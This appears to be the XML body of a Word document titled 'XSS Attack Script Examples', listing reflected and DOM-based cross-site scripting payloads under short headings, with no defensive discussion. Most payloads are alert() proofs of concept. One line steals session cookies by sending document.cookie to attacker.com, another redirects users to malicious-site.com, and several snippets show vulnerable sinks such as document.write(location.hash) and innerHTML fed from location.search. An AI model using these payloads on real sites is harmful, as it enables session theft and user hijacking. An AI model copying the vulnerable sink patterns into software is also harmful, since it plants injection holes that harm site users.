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XSS Attack Script Examples</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reflected XSS Scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Basic Alert Box:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Stealing Cookies:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Redirecting User:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;script&gt;window.location='http://malicious-site.com';&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Injecting Malicious HTML:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;img src=x onerror=alert('XSS')&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Exploiting Input Fields:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>http://victim.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Event Handler Exploit:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;a href="#" onmouseover="alert('XSS');"&gt;Hover here&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. DOM-Based XSS Scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Manipulating location.hash:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;a href="http://victim.com/#&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;Click here&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>In the JavaScript file:</w:t>
        <w:br/>
        <w:br/>
        <w:t>document.write(location.hash);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Injecting via document.URL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>http://victim.com/page.html?&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>In the JavaScript:</w:t>
        <w:br/>
        <w:br/>
        <w:t>var url = document.URL;</w:t>
        <w:br/>
        <w:t>document.write(url);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Dangerous eval() Usage:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;script&gt;eval("alert('XSS Attack!')");&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Manipulating InnerHTML:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>var userInput = location.search;</w:t>
        <w:br/>
        <w:t>document.getElementById('output').innerHTML = userInput;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Attack vector:</w:t>
        <w:br/>
        <w:br/>
        <w:t>http://victim.com/page.html?input=&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Using document.referrer:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>If the page writes document.referrer to the DOM:</w:t>
        <w:br/>
        <w:br/>
        <w:t>http://victim.com/page.html</w:t>
        <w:br/>
        <w:t>&lt;script&gt;document.write(document.referrer)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Attack payload:</w:t>
        <w:br/>
        <w:br/>
        <w:t>http://malicious-site.com/page.html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